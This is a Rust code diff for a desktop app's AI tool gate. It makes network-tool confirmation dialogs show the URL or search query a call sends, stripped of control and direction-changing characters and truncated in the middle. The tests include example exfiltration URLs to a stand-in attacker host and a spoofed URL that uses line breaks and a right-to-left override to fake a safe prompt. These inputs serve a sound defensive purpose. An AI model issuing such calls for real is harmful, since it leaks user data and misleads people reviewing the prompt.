@@ -137,7 +137,59 @@ pub struct ProjectTrust {
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub enum AiConfirm {
     Write(String),
-    Network(String),
+    /// A network tool and what it sends out, when the call names it (the
+    /// address a fetch reads, the words a search sends).
+    Network {
+        tool: String,
+        target: Option<String>,
+    },
+}
+
+/// The longest target a confirmation shows; a longer one keeps its start
+/// and end.
+const MAX_SHOWN_TARGET: usize = 200;
+
+/// What a network call sends out, as the confirmation shows it: control
+/// and direction-changing characters removed so it reads as one plain
+/// line, and a long one cut in the middle.
+fn shown_target(arguments: &serde_json::Value) -> Option<String> {
+    let (raw, quoted) = match arguments.get("url").and_then(serde_json::Value::as_str) {
+        Some(url) => (url, false),
+        None => (arguments.get("query")?.as_str()?, true),
+    };
+    let clean: String = raw
+        .chars()
+        .map(|character| {
+            if character.is_control() {
+                ' '
+            } else {
+                character
+            }
+        })
+        .filter(|character| {
+            !matches!(
+                character,
+                '\u{200b}'..='\u{200f}' | '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}' | '\u{feff}'
+            )
+        })
+        .collect();
+    let clean = clean.trim();
+    if clean.is_empty() {
+        return None;
+    }
+    let count = clean.chars().count();
+    let shown = if count > MAX_SHOWN_TARGET {
+        let head: String = clean.chars().take(MAX_SHOWN_TARGET * 3 / 4).collect();
+        let tail: String = clean.chars().skip(count - MAX_SHOWN_TARGET / 4).collect();
+        format!("{head}…{tail}")
+    } else {
+        clean.to_string()
+    };
+    Some(if quoted {
+        format!("\u{201c}{shown}\u{201d}")
+    } else {
+        shown
+    })
 }
 
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -622,9 +674,10 @@ pub fn ai_tool_gate(tool: &str, arguments: &serde_json::Value) -> AiToolGate {
                 AiToolGate::Allow
             }
         }
-        name if NETWORK_TOOLS.contains(&name) => {
-            AiToolGate::Confirm(AiConfirm::Network(name.to_string()))
-        }
+        name if NETWORK_TOOLS.contains(&name) => AiToolGate::Confirm(AiConfirm::Network {
+            tool: name.to_string(),
+            target: shown_target(arguments),
+        }),
         crate::cua_driver::DESKTOP_APPS_TOOL => AiToolGate::Forbid(DESKTOP_APPS_REFUSAL),
         _ => AiToolGate::Allow,
     }
@@ -1111,11 +1164,21 @@ pub async fn confirm_ai_tool<R: tauri::Runtime>(
             crate::i18n::t_with("dialog.restrictedWrite.message", &[("path", path)]),
             "dialog.restrictedWrite.confirm",
         ),
-        AiConfirm::Network(tool) => (
-            "dialog.restrictedNetwork.title",
-            crate::i18n::t_with("dialog.restrictedNetwork.message", &[("tool", tool)]),
-            "dialog.restrictedNetwork.confirm",
-        ),
+        AiConfirm::Network { tool, target } => {
+            let mut message =
+                crate::i18n::t_with("dialog.restrictedNetwork.message", &[("tool", tool)]);
+            // The address or words it sends, on their own line, so the user
+            // sees what leaves the computer before allowing it.
+            if let Some(target) = target {
+                message.push_str("\n\n");
+                message.push_str(target);
+            }
+            (
+                "dialog.restrictedNetwork.title",
+                message,
+                "dialog.restrictedNetwork.confirm",
+            )
+        }
     };
     native_confirm(&app, title, message, confirm).await
 }
@@ -1625,12 +1688,50 @@ mod tests {
         );
         assert_eq!(
             ai_tool_gate("literature_search", &json!({"query": "x"})),
-            AiToolGate::Confirm(AiConfirm::Network("literature_search".into()))
+            AiToolGate::Confirm(AiConfirm::Network {
+                tool: "literature_search".into(),
+                target: Some("\u{201c}x\u{201d}".into()),
+            })
         );
         assert_eq!(
             ai_tool_gate("read_file", &json!({"path": ".envrc"})),
             AiToolGate::Allow
         );
+    }
+
+    #[test]
+    fn the_network_prompt_shows_what_the_call_sends() {
+        use serde_json::json;
+        let target = |tool: &str, arguments: serde_json::Value| match ai_tool_gate(tool, &arguments)
+        {
+            AiToolGate::Confirm(AiConfirm::Network { target, .. }) => target,
+            other => panic!("{other:?}"),
+        };
+        assert_eq!(
+            target("web_fetch", json!({"url": "https://evil.example/c?d=abc"})).as_deref(),
+            Some("https://evil.example/c?d=abc")
+        );
+        assert_eq!(
+            target("web_search", json!({"query": "thesis title"})).as_deref(),
+            Some("\u{201c}thesis title\u{201d}")
+        );
+        // A long address keeps its start and end; line breaks and
+        // direction marks cannot disguise it.
+        let long = format!("https://evil.example/c?d={}END", "A".repeat(5_000));
+        let shown = target("web_fetch", json!({ "url": long })).unwrap();
+        assert!(shown.starts_with("https://evil.example/c?d=AAA"), "{shown}");
+        assert!(shown.ends_with("END") && shown.contains('…'), "{shown}");
+        assert!(shown.chars().count() <= MAX_SHOWN_TARGET + 1);
+        let spoofed = target(
+            "web_fetch",
+            json!({"url": "https://ok.example/\n\nAllow is safe\u{202e}txt.exe"}),
+        )
+        .unwrap();
+        assert!(
+            !spoofed.contains('\n') && !spoofed.contains('\u{202e}'),
+            "{spoofed}"
+        );
+        assert_eq!(target("list_overleaf_projects", json!({})), None);
     }
 
     #[test]
